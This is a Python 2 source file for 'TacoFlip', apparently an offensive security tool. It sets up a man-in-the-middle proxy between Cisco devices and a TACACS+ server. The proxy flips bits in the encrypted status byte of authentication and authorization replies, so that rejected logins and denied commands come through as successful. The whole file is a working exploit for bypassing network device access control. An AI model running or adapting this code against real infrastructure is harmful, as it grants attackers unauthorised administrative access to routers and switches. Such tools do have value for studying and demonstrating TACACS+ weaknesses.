#!/usr/bin/python
__author__ = 'GreenDog'
# thx to http://voorloopnul.com/blog/a-python-proxy-in-less-than-100-lines-of-code/
import socket
import select
import time
import sys
import argparse

# Changing the buffer_size and delay, you can improve the speed and bandwidth.
# But when buffer get to high or delay go too down, you can broke things
buffer_size = 4096
delay = 0.0001



def parse_args():
    parser = argparse.ArgumentParser(
        description="A tool for authentication/authorization bypass by MitM attack on Cisco devices and a Tacacs+ server")
    parser.add_argument(
        '-t', '--target', type=str, help='An IP address of a  Tacacs+ server', required=True)
    parser.add_argument(
        '-v', '--verbose', help='Verbose mode', action="store_true", dest="verbose", default=False, required=False)
    args = parser.parse_args()
    return args.target, args.verbose


class Forward:
    def __init__(self):
        self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self, host, port):
        try:
            self.forward.connect((host, port))
            return self.forward
        except Exception, e:
            print e
            return False


class TheServer:
    input_list = []
    channel = {}

    def __init__(self, host, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((host, port))
        self.server.listen(200)

    def main_loop(self):
        self.input_list.append(self.server)
        while 1:
            time.sleep(delay)
            ss = select.select
            inputready, outputready, exceptready = ss(self.input_list, [], [])
            for self.s in inputready:
                if self.s == self.server:
                    self.on_accept()
                    break

                self.data = self.s.recv(buffer_size)
                if len(self.data) == 0:
                    self.on_close()
                    break
                else:
                    self.on_recv()

    def on_accept(self):
        forward = Forward().start(forward_to[0], forward_to[1])
        clientsock, clientaddr = self.server.accept()
        if forward:
            print clientaddr, "has connected"
            self.input_list.append(clientsock)
            self.input_list.append(forward)
            self.channel[clientsock] = forward
            self.channel[forward] = clientsock
        else:
            print "Can't establish connection with remote server.",
            print "Closing connection with client side", clientaddr
            clientsock.close()

    def on_close(self):
        print self.s.getpeername(), "has disconnected"
        # remove objects from input_list
        self.input_list.remove(self.s)
        self.input_list.remove(self.channel[self.s])
        out = self.channel[self.s]
        # close the connection with client
        self.channel[out].close()  # equivalent to do self.s.close()
        # close the connection with remote server
        self.channel[self.s].close()
        # delete both objects from channel dict
        del self.channel[out]
        del self.channel[self.s]

    def on_recv(self):
        data = self.data
        # here we can parse and/or modify the data before send forward
        # print data.encode('hex')
        vers = data[0]
        p_type = data[1]
        seq_num = data[2]
        ses_id = data[4:8]
        print("Packet")

        verb("Tacacs+ version: ", vers)
        verb("Packet type: ", p_type)
        verb("Packet number: ", seq_num)
        verb("Session id: ", ses_id)
        length = int(data[8:12].encode('hex'), 16)
        verb("Packet length: ", str(length))

        enc_data = data[12:12 + length]
        verb("Encrypted data: ", enc_data)

        if (p_type == "\x01"):
            print("Authentication packet")
            if (seq_num == "\x04"):
                print("Bit flip for a good authentication")
                pseudo_pad = int(data[12].encode('hex'), 16) ^ 0x02
                verb("pseudo_pad:", str(pseudo_pad))
                new_pseudo_pad = pseudo_pad ^ 0x01
                verb("new_pseudo_pad: ", str(new_pseudo_pad))
                data = data[:12] + chr(new_pseudo_pad) + data[13:]
                verb("data: ", data)
        elif (p_type == "\x02"):
            print("Authorization packet")
            if (seq_num == "\x02"):
                print("Bit flip for a good authorization")
                pseudo_pad = int(data[12].encode('hex'), 16) ^ 0x10
                verb("pseudo_pad:", str(pseudo_pad))
                new_pseudo_pad = pseudo_pad ^ 0x01
                verb("new_pseudo_pad: ", str(new_pseudo_pad))
                data = data[:12] + chr(new_pseudo_pad) + data[13:]
                verb("data: ", data)

        elif (p_type == "\x03"):
            print("Accounting")
            #
        else:
            verb("A strange packet type!")
        self.channel[self.s].send(data)


def verb(desc, val=""):
    #
    if verbose:
        print desc, val.encode('hex')


if __name__ == '__main__':
    print ("")

    print("TacoFlip / Tacacs+ Mitm Auth bypass v0.1 beta")
    print("Alexey Tyurin - agrrrdog [at] gmail.com")
    print

    ip, verbose = parse_args()
    forward_to = (ip, 49)
    server = TheServer('', 49)
    try:
        server.main_loop()
    except KeyboardInterrupt:
        print "Ctrl C - Stopping server"
        sys.exit(1)
